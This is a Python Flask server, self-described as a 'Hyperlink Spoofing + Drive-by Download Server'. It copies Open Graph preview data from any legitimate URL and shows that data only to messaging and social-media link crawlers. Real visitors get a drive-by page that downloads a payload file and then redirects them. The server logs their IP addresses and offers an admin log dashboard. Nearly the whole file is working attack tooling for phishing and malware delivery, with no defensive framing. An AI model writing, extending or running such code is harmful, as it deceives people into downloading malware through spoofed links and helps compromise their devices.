"""
Hyperlink Spoofing + Drive-by Download Server
Universal OG tag fetching for ANY URL (YouTube, Detik, News, Blogs, etc.)

Usage:
    python server.py              # Run with default config
    python run.py                 # Run with dynamic input (recommended)
"""

from flask import Flask, render_template, send_file, redirect, request, Response, jsonify
import os
import urllib.request
import urllib.parse
import re
import json
from datetime import datetime
from html import unescape
from config import (
    LOCAL_IP, PORT, HOST, PUBLIC_URL, 
    TARGET_URL, DEFAULT_VIDEO_ID, 
    PAYLOAD_FILE, PAYLOAD_MIME, PAYLOAD_PATH, DOWNLOAD_NAME,
    CUSTOM_TITLE, CUSTOM_DESCRIPTION
)

app = Flask(__name__, template_folder="templates", static_folder="static")
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), "payload")

# ============================================================================
# CRAWLER DETECTION
# ============================================================================

CRAWLERS = [
    "facebookexternalhit",
    "Twitterbot",
    "TelegramBot",
    "LinkedInBot",
    "Slackbot",
    "Discordbot",
    "WhatsApp",
    "Googlebot",
    "Bingbot",
    "YandexBot",
    "Applebot",
    "Pinterest",
    "SkypeBot",
    "ViberBot",
]

def is_crawler(user_agent):
    """Detect if request is from a crawler"""
    ua_lower = user_agent.lower()
    for crawler in CRAWLERS:
        if crawler.lower() in ua_lower:
            return True
    return False

# ============================================================================
# UNIVERSAL OG TAG FETCHING
# ============================================================================

def fetch_page_html(url, timeout=8):
    """Fetch HTML content from any URL"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "identity",
        "Connection": "keep-alive",
    }
    
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            content_type = resp.headers.get("Content-Type", "")
            if "text/html" not in content_type and "text/plain" not in content_type:
                return None
            return resp.read().decode("utf-8", errors="ignore")
    except Exception as e:
        print(f"[!] Failed to fetch {url}: {e}")
        return None

def extract_meta_content(html, patterns):
    """Extract content from meta tags using multiple patterns"""
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
        if match:
            content = match.group(1).strip()
            content = unescape(content)
            content = content.replace('"', '&quot;').replace("'", "&#39;")
            return content
    return None

def extract_og_tags(html):
    """Extract Open Graph tags from HTML"""
    og = {}
    
    # OG Title
    og["title"] = extract_meta_content(html, [
        r'property="og:title"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:title"',
        r'property="og:title"\s+content=\'([^\']+)\'',
    ])
    
    # OG Description
    og["description"] = extract_meta_content(html, [
        r'property="og:description"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:description"',
        r'property="og:description"\s+content=\'([^\']+)\'',
    ])
    
    # OG Image
    og["image"] = extract_meta_content(html, [
        r'property="og:image"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:image"',
        r'property="og:image"\s+content=\'([^\']+)\'',
        r'property="og:image:url"\s+content="([^"]+)"',
        r'property="og:image:secure_url"\s+content="([^"]+)"',
    ])
    
    # OG URL
    og["url"] = extract_meta_content(html, [
        r'property="og:url"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:url"',
    ])
    
    # OG Type
    og["type"] = extract_meta_content(html, [
        r'property="og:type"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:type"',
    ])
    
    # OG Site Name
    og["site_name"] = extract_meta_content(html, [
        r'property="og:site_name"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+property="og:site_name"',
    ])
    
    # OG Video (for video content)
    og["video"] = extract_meta_content(html, [
        r'property="og:video"\s+content="([^"]+)"',
        r'property="og:video:url"\s+content="([^"]+)"',
        r'property="og:video:secure_url"\s+content="([^"]+)"',
    ])
    
    return og

def extract_twitter_tags(html):
    """Extract Twitter Card tags"""
    tw = {}
    
    tw["card"] = extract_meta_content(html, [
        r'name="twitter:card"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="twitter:card"',
    ])
    
    tw["title"] = extract_meta_content(html, [
        r'name="twitter:title"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="twitter:title"',
    ])
    
    tw["description"] = extract_meta_content(html, [
        r'name="twitter:description"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="twitter:description"',
    ])
    
    tw["image"] = extract_meta_content(html, [
        r'name="twitter:image"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="twitter:image"',
        r'name="twitter:image:src"\s+content="([^"]+)"',
    ])
    
    return tw

def extract_meta_tags(html):
    """Extract standard meta tags as fallback"""
    meta = {}
    
    # Title
    title_match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
    if title_match:
        meta["title"] = unescape(title_match.group(1).strip())
    
    # Description
    meta["description"] = extract_meta_content(html, [
        r'name="description"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="description"',
        r'name="description"\s+content=\'([^\']+)\'',
    ])
    
    # Image
    meta["image"] = extract_meta_content(html, [
        r'name="image"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="image"',
    ])
    
    return meta

def extract_favicon(html, base_url):
    """Extract favicon URL"""
    patterns = [
        r'rel="icon"\s+href="([^"]+)"',
        r'rel="shortcut icon"\s+href="([^"]+)"',
        r'href="([^"]+)"\s+rel="icon"',
        r'href="([^"]+)"\s+rel="shortcut icon"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            favicon = match.group(1)
            if favicon.startswith("//"):
                favicon = "https:" + favicon
            elif favicon.startswith("/"):
                parsed = urllib.parse.urlparse(base_url)
                favicon = f"{parsed.scheme}://{parsed.netloc}{favicon}"
            return favicon
    
    # Default favicon
    parsed = urllib.parse.urlparse(base_url)
    return f"{parsed.scheme}://{parsed.netloc}/favicon.ico"

def extract_main_image(html, base_url):
    """Try to extract main content image from page"""
    patterns = [
        r'<img[^>]+class="[^"]*article[^"]*"[^>]+src="([^"]+)"',
        r'<img[^>]+class="[^"]*content[^"]*"[^>]+src="([^"]+)"',
        r'<img[^>]+class="[^"]*featured[^"]*"[^>]+src="([^"]+)"',
        r'<img[^>]+class="[^"]*hero[^"]*"[^>]+src="([^"]+)"',
        r'<img[^>]+itemprop="image"[^>]+src="([^"]+)"',
        r'<img[^>]+src="([^"]+)"[^>]+class="[^"]*article[^"]*"',
        r'<img[^>]+src="([^"]+)"[^>]+class="[^"]*content[^"]*"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            img_url = match.group(1)
            if img_url.startswith("//"):
                img_url = "https:" + img_url
            elif img_url.startswith("/"):
                parsed = urllib.parse.urlparse(base_url)
                img_url = f"{parsed.scheme}://{parsed.netloc}{img_url}"
            # Skip tiny images (icons, trackers)
            if not any(x in img_url.lower() for x in ['icon', 'logo', 'avatar', 'pixel', 'track', '1x1']):
                return img_url
    
    return None

def fetch_oembed(url):
    """Fetch oEmbed data for supported platforms (YouTube, Vimeo, etc.)"""
    oembed_endpoints = {
        "youtube.com": "https://www.youtube.com/oembed",
        "youtu.be": "https://www.youtube.com/oembed",
        "vimeo.com": "https://vimeo.com/api/oembed.json",
        "dailymotion.com": "https://api.dailymotion.com/video/oembed",
        "soundcloud.com": "https://soundcloud.com/oembed",
        "mixcloud.com": "https://www.mixcloud.com/oembed/",
        "spotify.com": "https://open.spotify.com/oembed",
        "twitter.com": "https://publish.twitter.com/oembed",
        "x.com": "https://publish.twitter.com/oembed",
    }
    
    parsed = urllib.parse.urlparse(url)
    domain = parsed.netloc.lower().replace("www.", "")
    
    # Find matching endpoint
    for platform_domain, endpoint in oembed_endpoints.items():
        if platform_domain in domain:
            try:
                oembed_url = f"{endpoint}?url={urllib.parse.quote(url, safe='')}&format=json"
                req = urllib.request.Request(oembed_url, headers={
                    "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)"
                })
                with urllib.request.urlopen(req, timeout=8) as resp:
                    data = json.loads(resp.read().decode("utf-8"))
                    return {
                        "title": data.get("title", ""),
                        "description": data.get("author_name", ""),
                        "image": data.get("thumbnail_url", ""),
                        "author": data.get("author_name", ""),
                        "author_url": data.get("author_url", ""),
                        "type": data.get("type", ""),
                        "platform": platform_domain,
                    }
            except Exception as e:
                print(f"[!] oEmbed failed for {platform_domain}: {e}")
                continue
    
    return None

def generate_thumbnail_from_url(url):
    """Generate thumbnail URL based on source platform"""
    url_lower = url.lower()
    
    # YouTube
    yt_patterns = [
        r'youtube\.com/watch\?v=([a-zA-Z0-9_-]{11})',
        r'youtu\.be/([a-zA-Z0-9_-]{11})',
        r'youtube\.com/embed/([a-zA-Z0-9_-]{11})',
        r'youtube\.com/shorts/([a-zA-Z0-9_-]{11})',
    ]
    for pattern in yt_patterns:
        match = re.search(pattern, url_lower)
        if match:
            video_id = match.group(1)
            return {
                "thumbnail": f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg",
                "fallback": f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg",
                "type": "video",
                "platform": "YouTube"
            }
    
    # Vimeo
    vimeo_match = re.search(r'vimeo\.com/(\d+)', url_lower)
    if vimeo_match:
        video_id = vimeo_match.group(1)
        return {
            "thumbnail": f"https://vumbnail.com/{video_id}.jpg",
            "fallback": f"https://i.vimeocdn.com/video/{video_id}_640x360.jpg",
            "type": "video",
            "platform": "Vimeo"
        }
    
    # Instagram
    insta_match = re.search(r'instagram\.com/(?:p|reel)/([a-zA-Z0-9_-]+)', url_lower)
    if insta_match:
        return {
            "thumbnail": "",
            "fallback": "",
            "type": "image",
            "platform": "Instagram"
        }
    
    # Twitter/X
    if "twitter.com" in url_lower or "x.com" in url_lower:
        return {
            "thumbnail": "",
            "fallback": "",
            "type": "social",
            "platform": "Twitter"
        }
    
    # TikTok
    if "tiktok.com" in url_lower:
        return {
            "thumbnail": "",
            "fallback": "",
            "type": "video",
            "platform": "TikTok"
        }
    
    # Detik
    if "detik.com" in url_lower:
        return {
            "thumbnail": "",
            "fallback": "",
            "type": "news",
            "platform": "Detik"
        }
    
    # Kompas
    if "kompas.com" in url_lower:
        return {
            "thumbnail": "",
            "fallback": "",
            "type": "news",
            "platform": "Kompas"
        }
    
    # Generic
    return {
        "thumbnail": "",
        "fallback": "",
        "type": "website",
        "platform": "Web"
    }

def fetch_universal_og(url):
    """
    Universal OG tag fetcher - works for ANY URL
    Returns complete preview data for any website
    """
    print(f"[*] Fetching OG tags from: {url}")
    
    # Get platform info
    platform_info = generate_thumbnail_from_url(url)
    
    # Try oEmbed first for supported platforms
    oembed_data = fetch_oembed(url)
    if oembed_data and oembed_data.get("title"):
        print(f"[✓] oEmbed data found: {oembed_data['title'][:50]}...")
        return {
            "title": oembed_data["title"],
            "description": oembed_data.get("description", "Watch on " + oembed_data.get("platform", "Web")),
            "image": oembed_data.get("image", platform_info["thumbnail"]),
            "image_fallback": platform_info["fallback"],
            "url": url,
            "type": oembed_data.get("type", "video.other"),
            "site_name": oembed_data.get("platform", platform_info["platform"]),
            "favicon": "",
            "platform": oembed_data.get("platform", platform_info["platform"]),
            "is_video": oembed_data.get("type") == "video" or "video" in url.lower(),
            "author": oembed_data.get("author", ""),
            "author_url": oembed_data.get("author_url", ""),
        }
    
    # Fallback to HTML parsing
    print(f"[*] No oEmbed, falling back to HTML parsing...")
    html = fetch_page_html(url)
    
    if not html:
        print(f"[!] Could not fetch HTML from {url}")
        # Return minimal data based on platform
        return {
            "title": "Shared Content",
            "description": "Click to view content",
            "image": platform_info["thumbnail"],
            "image_fallback": platform_info["fallback"],
            "url": url,
            "type": platform_info["type"],
            "site_name": platform_info["platform"],
            "favicon": "",
            "platform": platform_info["platform"],
            "is_video": "video" in url.lower(),
        }
    
    # Extract all tags
    og_tags = extract_og_tags(html)
    twitter_tags = extract_twitter_tags(html)
    meta_tags = extract_meta_tags(html)
    favicon = extract_favicon(html, url)
    
    # Merge with priority: OG > Twitter > Meta
    title = og_tags.get("title") or twitter_tags.get("title") or meta_tags.get("title") or "Shared Content"
    description = og_tags.get("description") or twitter_tags.get("description") or meta_tags.get("description") or "Click to view content"
    image = og_tags.get("image") or twitter_tags.get("image") or meta_tags.get("image") or ""
    site_name = og_tags.get("site_name") or ""
    content_type = og_tags.get("type") or "website"
    
    # If no image from tags, try to extract from page
    if not image:
        image = extract_main_image(html, url) or ""
    
    # If still no image, use platform thumbnail
    if not image and platform_info["thumbnail"]:
        image = platform_info["thumbnail"]
    
    # Make image URL absolute
    if image and not image.startswith("http"):
        parsed = urllib.parse.urlparse(url)
        if image.startswith("//"):
            image = "https:" + image
        elif image.startswith("/"):
            image = f"{parsed.scheme}://{parsed.netloc}{image}"
        else:
            image = f"{parsed.scheme}://{parsed.netloc}/{image}"
    
    # Detect platform from site_name or URL
    if not site_name:
        site_name = platform_info["platform"]
    
    result = {
        "title": title,
        "description": description[:200] + "..." if len(description) > 200 else description,
        "image": image,
        "image_fallback": platform_info["fallback"],
        "url": og_tags.get("url") or url,
        "type": content_type,
        "site_name": site_name,
        "favicon": favicon,
        "platform": platform_info["platform"],
        "is_video": content_type in ["video.other", "video"] or og_tags.get("video") is not None,
    }
    
    print(f"[✓] OG tags fetched: {result['title'][:50]}...")
    print(f"    Image: {result['image'][:80]}...")
    
    return result

# ============================================================================
# ROUTES
# ============================================================================

@app.route("/")
def index():
    """Default: redirect to /v with target URL"""
    return redirect(f"/v?id={urllib.parse.quote(TARGET_URL)}", code=302)

@app.route("/v")
def video():
    """
    Main endpoint for hyperlink spoofing.
    
    Query:
        id = Encoded target URL
    
    Behavior:
        - Crawler (WA/Telegram) → Return HTML with OG tags
        - Real user → Auto-download + redirect
    """
    encoded_url = request.args.get("id", urllib.parse.quote(TARGET_URL))
    target_url = urllib.parse.unquote(encoded_url)
    ua = request.headers.get("User-Agent", "")
    client_ip = request.remote_addr
    
    # Fetch OG tags (use custom if provided, otherwise auto-fetch)
    if CUSTOM_TITLE or CUSTOM_DESCRIPTION:
        og = {
            "title": CUSTOM_TITLE or "Shared Content",
            "description": CUSTOM_DESCRIPTION or "Click to view",
            "image": "",
            "image_fallback": "",
            "url": target_url,
            "type": "website",
            "site_name": "Web",
            "favicon": "",
            "platform": "Web",
            "is_video": False,
        }
    else:
        og = fetch_universal_og(target_url)
    
    download_url = f"{PUBLIC_URL}/payload/{DOWNLOAD_NAME}"
    real_url = target_url
    
    if is_crawler(ua):
        # === RESPONS UNTUK CRAWLER ===
        print(f"[CRAWLER] {client_ip} | UA={ua[:60]}")
        
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="{og['title']}">
    <meta property="og:description" content="{og['description']}">
    <meta property="og:image" content="{og['image']}">
    <meta property="og:url" content="{og['url']}">
    <meta property="og:type" content="{og['type']}">
    <meta property="og:site_name" content="{og['site_name']}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{og['title']}">
    <meta name="twitter:description" content="{og['description']}">
    <meta name="twitter:image" content="{og['image']}">
    <link rel="icon" href="{og['favicon']}">
    <title>{og['title']}</title>
</head>
<body>
    <p>Redirecting to {og['site_name']}...</p>
</body>
</html>"""
        return Response(html, mimetype="text/html")
    
    else:
        # === RESPONS UNTUK REAL USER ===
        print(f"[USER] {client_ip} | UA={ua[:60]}")
        
        # Log access
        try:
            log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] USER ACCESS: {client_ip} | url={target_url[:80]} | {ua[:60]}\n"
            with open("access.log", "a") as f:
                f.write(log_entry)
        except Exception:
            pass
        
        return render_template(
            "driveby.html",
            og_title=og["title"],
            og_desc=og["description"],
            og_thumbnail=og["image"],
            og_thumbnail_fallback=og["image_fallback"],
            og_favicon=og["favicon"],
            og_site_name=og["site_name"],
            og_type=og["type"],
            og_url=og["url"],
            is_video=og["is_video"],
            content_url=target_url,
            download_url=download_url,
            download_name=DOWNLOAD_NAME,
            real_url=real_url,
            platform=og["platform"],
        )

@app.route("/payload/<filename>")
def serve_payload(filename):
    """Serve payload file with proper headers"""
    filepath = os.path.join(PAYLOAD_DIR, filename)
    if not os.path.exists(filepath):
        filepath = PAYLOAD_PATH
    
    if os.path.exists(filepath):
        client_ip = request.remote_addr
        print(f"[+] PAYLOAD: {client_ip} → {filename}")
        
        try:
            log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] PAYLOAD DOWNLOADED: {client_ip} → {filename}\n"
            with open("access.log", "a") as f:
                f.write(log_entry)
        except Exception:
            pass
        
        response = send_file(
            filepath,
            mimetype=PAYLOAD_MIME,
            as_attachment=True,
            download_name=filename,
        )
        response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
        response.headers["X-Content-Type-Options"] = "nosniff"
        return response
    
    return "Not Found", 404

@app.route("/admin")
def admin():
    """Admin dashboard with access logs"""
    logs = []
    if os.path.exists("access.log"):
        with open("access.log", "r") as f:
            logs = f.readlines()[-50:]
    
    return render_template("admin.html", logs=logs, config={
        "target_url": TARGET_URL,
        "payload_file": PAYLOAD_FILE,
        "download_name": DOWNLOAD_NAME,
        "public_url": PUBLIC_URL,
        "local_ip": LOCAL_IP,
        "port": PORT,
    })

@app.route("/health")
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "config": {
            "local_ip": LOCAL_IP,
            "port": PORT,
            "public_url": PUBLIC_URL,
            "target_url": TARGET_URL,
            "payload_file": PAYLOAD_FILE,
        }
    })

@app.route("/api/logs")
def api_logs():
    """API endpoint for logs"""
    logs = []
    if os.path.exists("access.log"):
        with open("access.log", "r") as f:
            logs = f.readlines()[-100:]
    return jsonify({"logs": logs})

@app.route("/api/fetch-og")
def api_fetch_og():
    """API endpoint to fetch OG tags for any URL"""
    url = request.args.get("url")
    if not url:
        return jsonify({"error": "URL parameter required"}), 400
    
    og = fetch_universal_og(url)
    return jsonify(og)

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║  Hyperlink Spoofing + Drive-by Download Server              ║
    ║  Universal OG Fetcher                                       ║
    ║                                                              ║
    ║  Local:   http://{LOCAL_IP}:{PORT}                            ║
    ║  Public:  {PUBLIC_URL}  ║
    ║  Admin:   http://{LOCAL_IP}:{PORT}/admin                      ║
    ║                                                              ║
    ║  Target URL: {TARGET_URL[:45]}  ║
    ║  Payload:    {PAYLOAD_FILE}  ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    app.run(host=HOST, port=PORT, debug=False)
